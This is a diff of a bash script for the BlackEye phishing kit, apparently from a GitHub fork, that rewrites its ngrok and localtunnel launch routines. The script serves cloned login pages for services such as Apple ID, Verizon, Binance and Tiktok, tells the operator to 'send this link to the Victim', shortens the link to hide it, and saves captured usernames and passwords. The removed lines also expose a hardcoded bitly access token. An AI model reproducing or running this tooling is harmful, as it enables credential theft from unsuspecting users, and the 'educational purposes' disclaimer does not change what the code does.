@@ -1,24 +1,17 @@
 #!/bin/bash
 
 open_page() {
-    url="https://github.com/EricksonAtHome/bes"
-     open "$url"
+    url="https://github.com/amir13872"
+    open "$url"
 }
-
-open_page_uts() {
-    url="https://github.com/EricksonAtHome/UTS7"
-     open "$url"
-}
-
 
 start_server() {
     server=$1
-    # Start de server
-    echo "Start de server voor: $server"
+    # Start the server
+    echo "Starting server for: $server"
 }
 
-# Upgraded by: @EricksonAtHome (https://github.com/EricksonAtHome/blackeye)
-#Enhanced ngrok tunnelling
+# Upgraded by: @EricksonAtHome (https://github.com/EricksonAtHome/blackeye)  *i accept it* :)
 trap 'printf "\n";stop;exit 1' 2
 menu() {
 
@@ -39,12 +32,7 @@ printf "          \e[1;92m[\e[0m\e[1;77m14\e[0m\e[1;92m]\e[0m\e[1;91m Pinterest\
 printf "          \e[1;92m[\e[0m\e[1;77m15\e[0m\e[1;92m]\e[0m\e[1;91m Apple ID\e[0m       \e[1;92m[\e[0m\e[1;77m31\e[0m\e[1;92m]\e[0m\e[1;91m Tiktok \e[0m                             \n"
 printf "          \e[1;92m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;91m Verizon\e[0m        \e[1;92m[\e[0m\e[1;77m32\e[0m\e[1;92m]\e[0m\e[1;91m Playstation  \e[0m           \e[1;94m                  \n"
 printf "          \e[1;92m[\e[0m\e[1;77m41\e[0m\e[1;92m]\e[0m\e[1;91m Binance Email Support \e[0m       \e[1;94m             \n"
-printf "          \e[1;92m[\e[0m\e[1;77m42\e[0m\e[1;92m]\e[0m\e[1;91m User Tracking System 7 \e[0m       \e[1;94m             \n"
-
-
-
-
-
+printf "          \e[1;92m[\e[0m\e[1;77m42\e[0m\e[1;92m]\e[0m\e[1;91m Ngrok\e[0m\n"
 
 
 read -p $'\n\e[1;92m\e[0m\e[1;77m\e[0m\e[1;92m ┌─[ Choose an option:]─[~]
@@ -213,7 +201,8 @@ elif [[ $option == 41 ]]; then
     open_page
 
 elif [[ $option == 42 ]]; then
-    open_page_uts
+    server="ngrok"
+    start
 
 else
 printf "\e[1;93m [!] Invalid option!\e[0m\n"
@@ -224,13 +213,8 @@ fi
 
 stop() {
 
-checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
 checkphp=$(ps aux | grep -o "php" | head -n1)
 checknode=$(ps aux | grep -o "node" | head -n1)
-if [[ $checkngrok == *'ngrok'* ]]; then
-pkill -f -2 ngrok > /dev/null 2>&1
-killall -2 ngrok > /dev/null 2>&1
-fi
 if [[ $checkphp == *'php'* ]]; then
 pkill -f -2 php > /dev/null 2>&1
 killall -2 php > /dev/null 2>&1
@@ -249,7 +233,7 @@ printf "     \e[101m\e[1;77m:: Disclaimer: Developers assume no liability and ar
 printf "     \e[101m\e[1;77m:: responsible for any misuse or damage caused by BlackEye.  ::\e[0m\n"
 printf "     \e[101m\e[1;77m:: Only use for educational purporses!!                      ::\e[0m\n"
 printf "\n"
-printf "     \e[101m\e[1;77m::     BLACKEYE By @EricksonAtHome                           ::\e[0m\n"
+printf "     \e[101m\e[1;77m::     BLACKEYE By @EricksonAtHome and forked by @amir13872                           ::\e[0m\n"
 printf "\n"
 }
 
@@ -307,7 +291,6 @@ printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77
 cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
 killall -2 php > /dev/null 2>&1
-killall -2 ngrok > /dev/null 2>&1
 killall -2 node > /dev/null 2>&1
 exit 1
 
@@ -368,84 +351,25 @@ getcredentials
 }
 start() {
 printf "\n"
-printf "1.Ngrok\n"
-printf "2.Localtunnel\n"
+printf "1.Localtunnel\n"
+printf "2.Ngrok\n"
 echo ""
 read -p $'\n\e[1;92m\e[0m\e[1;77m\e[0m\e[1;92m ┌─[ Choose the tunneling method:]─[~]
  └──╼ ~ ' host
  
 if [[ $host == 1 ]]; then
 sleep 1
-start_ngrok
+start_localtunnel
 elif [[ $host == 2 ]]; then
 sleep 1
-start_localtunnel
+start_ngrok
 fi
 }
-
-start_ngrok() {
-if [[ -e sites/$server/ip.txt ]]; then
-rm -rf sites/$server/ip.txt
-
-fi
-if [[ -e sites/$server/usernames.txt ]]; then
-rm -rf sites/$server/usernames.txt
-
-fi
-
-
-if [[ -e ngrok ]]; then
-echo ""
-else
-
-printf "\e[1;92m[\e[0m*\e[1;92m] Downloading Ngrok...\n"
-arch=$(uname -a | grep -o 'arm' | head -n1)
-arch2=$(uname -a | grep -o 'Android' | head -n1)
-if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
-wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
-
-if [[ -e ngrok-stable-linux-arm.zip ]]; then
-unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
-chmod +x ngrok
-rm -rf ngrok-stable-linux-arm.zip
-else
-printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
-exit 1
-fi
-
-
-
-else
-wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
-if [[ -e ngrok-stable-linux-386.zip ]]; then
-unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
-chmod +x ngrok
-rm -rf ngrok-stable-linux-386.zip
-else
-printf "\e[1;93m[!] Download error... \e[0m\n"
-exit 1
-fi
-fi
-fi
 
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
 cd sites/$server && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
 sleep 2
-printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
-./ngrok http 127.0.0.1:5555  > /dev/null 2>&1 &
-sleep 10
 
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
-printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" $link
-Accesstoken=433bdc6028d67bba06cf95286e923cde8c0906c7
-api=https://api-ssl.bitly.com/v4/shorten
-short_link=`curl -s -H Authorization:\ $Accesstoken -H Content-Type: -d '{"long_url": "'"$link"\"} $api | jq -j .link | xsel -ib; xsel -ob;` 
-printf "\e[1;92m[\e[0m*\e[1;92m] Use shortened link instead:\e[0m\e[1;77m %s\e[0m\n" $short_link
-echo ""
-echo ""
-
-checkfound
-}
 start_localtunnel()  {
 if [[ -e sites/$server/ip.txt ]]; then
 rm -rf sites/$server/ip.txt
@@ -461,12 +385,35 @@ cd sites/$server && php -S 127.0.0.1:5555 > /dev/null 2>&1 &
 sleep 2
 
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting localtunnel server...\n"
-./ngrok http 127.0.0.1:5555  > /dev/null 2>&1 &
-sleep 8
 lt --port 5555 --subdomain wmw-$server-com > /dev/null 2>&1 &
 sleep 4
 printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" "https://wmw-"$server"-com.loca.lt"
 short_link=`wget -q -O - http://tinyurl.com/api-create.php?url=https://wmw-$server-com.loca.lt`
+printf "\e[1;92m[\e[0m*\e[1;92m] Use shortened link instead:\e[0m\e[1;77m %s\e[0m\n" $short_link
+echo ""
+echo ""
+
+checkfound
+}
+
+start_ngrok() {
+if [[ -e sites/$server/ip.txt ]]; then
+rm -rf sites/$server/ip.txt
+fi
+if [[ -e sites/$server/usernames.txt ]]; then
+rm -rf sites/$server/usernames.txt
+fi
+
+printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
+cd sites/$server && php -S 127.0.0.1:5555 > /dev/null 2>&1 &
+sleep 2
+
+printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
+./ngrok http 5555 > /dev/null 2>&1 &
+sleep 10
+ngrok_url=$(curl -s http://127.0.0.1:4040/api/tunnels | jq -r '.tunnels[0].public_url')
+printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" $ngrok_url
+short_link=$(wget -q -O - http://tinyurl.com/api-create.php?url=$ngrok_url)
 printf "\e[1;92m[\e[0m*\e[1;92m] Use shortened link instead:\e[0m\e[1;77m %s\e[0m\n" $short_link
 echo ""
 echo ""
@@ -497,3 +444,4 @@ rm -rf .gitignore
 rm -rf .nojekyll
 banner
 menu
+
